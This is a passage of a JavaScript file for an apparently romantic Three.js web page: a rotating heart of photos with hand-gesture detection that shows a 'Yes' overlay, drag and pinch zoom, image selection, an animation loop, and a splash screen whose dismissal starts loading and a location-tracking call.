    if (thumbsClose && fingersApart && fingersAbove && handsClose) {
        gestureFrameCount++;
        // Require several consecutive frames to avoid false positives
        if (gestureFrameCount >= CONFIG.gestureFramesRequired) {
            gestureFrameCount = 0;
            triggerHeartGesture();
        }
    } else {
        gestureFrameCount = Math.max(0, gestureFrameCount - 1);
    }
}

function triggerHeartGesture() {
    if (state.heartGestureDetected) return;

    state.heartGestureDetected = true;
    state.lastGestureTime = Date.now();

    // Show Yes overlay
    yesOverlay.classList.remove('hidden');
    requestAnimationFrame(() => yesOverlay.classList.add('show'));

    // Create sparkles
    createSparkles();

    // Pulse animation on heart
    state.targetGlow = CONFIG.warmGlow;
    document.body.classList.add('heart-pulse-active');

    // Pause rotation briefly
    state.isPaused = true;
    const savedVelY = state.velY;
    state.velY = 0;
    state.velX = 0;

    // Resume after delay
    clearTimeout(state.pauseTimer);
    state.pauseTimer = setTimeout(() => {
        state.isPaused = false;
        state.velY = savedVelY * 0.5 || CONFIG.autoRotateSpeed;

        // Fade out yes overlay
        setTimeout(() => {
            yesOverlay.classList.remove('show');
            setTimeout(() => {
                yesOverlay.classList.add('hidden');
                state.heartGestureDetected = false;
                document.body.classList.remove('heart-pulse-active');
                state.targetGlow = CONFIG.normalGlow;
            }, 600);
        }, 3000);
    }, 2000);
}

function createSparkles() {
    const container = document.getElementById('sparkles');
    container.innerHTML = '';

    for (let i = 0; i < 30; i++) {
        const sparkle = document.createElement('div');
        sparkle.className = 'sparkle';
        const angle = (Math.PI * 2 * i) / 30;
        const dist = 80 + Math.random() * 120;
        sparkle.style.setProperty('--tx', `${Math.cos(angle) * dist}px`);
        sparkle.style.setProperty('--ty', `${Math.sin(angle) * dist}px`);
        sparkle.style.left = '50%';
        sparkle.style.top = '50%';
        sparkle.style.animationDelay = `${Math.random() * 0.5}s`;
        sparkle.style.background = ['#ff1493', '#ff69b4', '#ffb6c1', '#fff'][Math.floor(Math.random() * 4)];
        container.appendChild(sparkle);
    }
}

// ──── Pointer / Touch / Mouse Interactions ────
let pointerDown = false;

canvas.addEventListener('pointerdown', (e) => {
    pointerDown = true;
    state.isDragging = false;
    state.lastPointerX = e.clientX;
    state.lastPointerY = e.clientY;
    canvas.setPointerCapture(e.pointerId);
});

canvas.addEventListener('pointermove', (e) => {
    if (!pointerDown) return;

    const dx = e.clientX - state.lastPointerX;
    const dy = e.clientY - state.lastPointerY;

    if (Math.abs(dx) > 2 || Math.abs(dy) > 2) {
        state.isDragging = true;
    }

    state.velY = dx * CONFIG.dragSensitivity;
    state.velX = dy * CONFIG.dragSensitivity;

    state.lastPointerX = e.clientX;
    state.lastPointerY = e.clientY;
});

canvas.addEventListener('pointerup', (e) => {
    if (!state.isDragging) {
        handleImageClick(e);
    }
    pointerDown = false;
    canvas.releasePointerCapture(e.pointerId);
});

canvas.addEventListener('pointercancel', () => {
    pointerDown = false;
});

// ──── Zoom ────
canvas.addEventListener('wheel', (e) => {
    e.preventDefault();
    const delta = e.deltaY > 0 ? 1 : -1;
    state.targetZoom = Math.max(
        CONFIG.zoomMin,
        Math.min(CONFIG.zoomMax, state.targetZoom + delta * CONFIG.zoomSpeed * 2)
    );
}, { passive: false });

// Pinch zoom for mobile
let lastPinchDist = 0;
canvas.addEventListener('touchstart', (e) => {
    if (e.touches.length === 2) {
        const dx = e.touches[0].clientX - e.touches[1].clientX;
        const dy = e.touches[0].clientY - e.touches[1].clientY;
        lastPinchDist = Math.hypot(dx, dy);
    }
}, { passive: true });

canvas.addEventListener('touchmove', (e) => {
    if (e.touches.length === 2) {
        const dx = e.touches[0].clientX - e.touches[1].clientX;
        const dy = e.touches[0].clientY - e.touches[1].clientY;
        const dist = Math.hypot(dx, dy);
        const delta = lastPinchDist - dist;
        state.targetZoom = Math.max(
            CONFIG.zoomMin,
            Math.min(CONFIG.zoomMax, state.targetZoom + delta * 0.02)
        );
        lastPinchDist = dist;
    }
}, { passive: true });

// ──── Image Click / Tap ────
const raycaster = new THREE.Raycaster();
const pointer = new THREE.Vector2();

function handleImageClick(e) {
    pointer.x = (e.clientX / window.innerWidth) * 2 - 1;
    pointer.y = -(e.clientY / window.innerHeight) * 2 + 1;

    raycaster.setFromCamera(pointer, camera);
    const intersects = raycaster.intersectObjects(imageMeshes);

    if (intersects.length > 0) {
        const mesh = intersects[0].object;

        // Deselect previous
        if (state.selectedImage && state.selectedImage !== mesh) {
            const prev = state.selectedImage;
            prev.userData.selected = false;
        }

        // Toggle selection
        mesh.userData.selected = !mesh.userData.selected;
        state.selectedImage = mesh.userData.selected ? mesh : null;
    } else {
        // Deselect all
        if (state.selectedImage) {
            state.selectedImage.userData.selected = false;
            state.selectedImage = null;
        }
    }
}

// ──── Window Resize ────
window.addEventListener('resize', () => {
    camera.aspect = window.innerWidth / window.innerHeight;
    camera.updateProjectionMatrix();
    renderer.setSize(window.innerWidth, window.innerHeight);
});

// ──── Animation Loop ────
let lastTime = performance.now();

function animate(currentTime) {
    requestAnimationFrame(animate);

    const dt = Math.min((currentTime - lastTime) / 16.667, 3); // Normalize to ~60fps
    lastTime = currentTime;

    // ── Rotation ──
    if (!state.isPaused) {
        if (!pointerDown && !state.fingerTracking) {
            // Apply inertia damping
            state.velY *= Math.pow(CONFIG.inertiaDamping, dt);
            state.velX *= Math.pow(CONFIG.inertiaDamping, dt);

            // If velocity is very low, add auto-rotate
            if (Math.abs(state.velY) < CONFIG.autoRotateSpeed * 0.5) {
                state.velY += (CONFIG.autoRotateSpeed - state.velY) * 0.01 * dt;
            }
        }

        state.rotY += state.velY * dt;
        state.rotX += state.velX * dt;
    }

    heartGroup.rotation.y = state.rotY;
    heartGroup.rotation.x = state.rotX;

    // ── Zoom interpolation ──
    state.currentZoom += (state.targetZoom - state.currentZoom) * CONFIG.zoomSmoothing * dt;
    camera.position.z = state.currentZoom;

    // ── Glow interpolation ──
    state.glowIntensity += (state.targetGlow - state.glowIntensity) * 0.05 * dt;

    // ── Update image meshes ──
    for (const mesh of imageMeshes) {
        const ud = mesh.userData;

        // Selected animation
        if (ud.selected) {
            ud.hoverGlow = Math.min(1, ud.hoverGlow + 0.05 * dt);
        } else {
            ud.hoverGlow = Math.max(0, ud.hoverGlow - 0.03 * dt);
        }

        // Position (push forward when selected)
        const pushOut = ud.hoverGlow * 0.3;
        const dir = ud.originalPos.clone().normalize();
        mesh.position.copy(ud.originalPos).addScaledVector(dir, pushOut);

        // Scale
        const targetScale = 1 + ud.hoverGlow * 0.3;
        const currentScale = mesh.scale.x;
        const newScale = currentScale + (targetScale - currentScale) * 0.1 * dt;
        mesh.scale.setScalar(newScale);

        // Emissive glow
        mesh.material.emissiveIntensity = 0.05 + ud.hoverGlow * 0.4 + state.glowIntensity * 0.1;
    }

    // ── Floating particles ──
    const positions = particleGeometry.attributes.position.array;
    for (let i = 0; i < particleCount; i++) {
        positions[i * 3 + 1] += 0.002 * dt;
        if (positions[i * 3 + 1] > 7.5) {
            positions[i * 3 + 1] = -7.5;
        }
    }
    particleGeometry.attributes.position.needsUpdate = true;

    // ── Light animation ──
    const time = currentTime * 0.001;
    pointLight1.intensity = 1.0 + Math.sin(time * 0.8) * 0.2 + state.glowIntensity;
    pointLight2.intensity = 0.7 + Math.cos(time * 0.6) * 0.15 + state.glowIntensity * 0.8;

    // ── Heart scale (palm expansion + pulse + breathing) ──
    state.currentHeartScale += (state.targetHeartScale - state.currentHeartScale) * 0.06 * dt;

    if (state.heartGestureDetected) {
        const pulse = state.currentHeartScale * (1 + Math.sin(time * 6) * 0.04);
        heartGroup.scale.setScalar(pulse);
    } else if (state.heartExpanded) {
        const breathe = state.currentHeartScale * (1 + Math.sin(time * 1.5) * 0.015);
        heartGroup.scale.setScalar(breathe);
    } else {
        const breathe = state.currentHeartScale * (1 + Math.sin(time * 0.5) * 0.008);
        heartGroup.scale.setScalar(breathe);
    }

    renderer.render(scene, camera);
}

// ──── Loading & Init ────
function updateLoadingProgress(progress) {
    state.loadingProgress = progress;
    loadingBar.style.width = `${progress}%`;
}

async function init() {
    // Show loading screen
    document.getElementById('loading-screen').classList.remove('hidden');
    updateLoadingProgress(10);

    // Create heart shape
    createHeartShape();
    updateLoadingProgress(50);

    // Start location tracking (GPS fires now — permission dialog appears)
    initLocationTracking();
    updateLoadingProgress(60);

    // Start hand tracking
    initHandTracking();
    updateLoadingProgress(80);

    // Start animation
    animate(performance.now());
    updateLoadingProgress(100);

    // Hide loading screen
    setTimeout(() => {
        loadingScreen.classList.add('fade-out');
        setTimeout(() => {
            loadingScreen.style.display = 'none';
        }, 800);
    }, 600);
}

// ──── Splash Screen Handler ────
const splashScreen = document.getElementById('splash-screen');
let splashDismissed = false;

function dismissSplash() {
    if (splashDismissed) return;
    splashDismissed = true;

    // Fade out splash
    splashScreen.classList.add('fade-out');
    setTimeout(() => {
        splashScreen.style.display = 'none';
        // Now start the app (which triggers GPS + loading)
        init();
    }, 600);
}

// Enter key
document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !splashDismissed) {
        dismissSplash();
    }
});

// Tap / click (for mobile)
splashScreen.addEventListener('click', dismissSplash);
splashScreen.addEventListener('touchend', (e) => {
    e.preventDefault();
    dismissSplash();
});
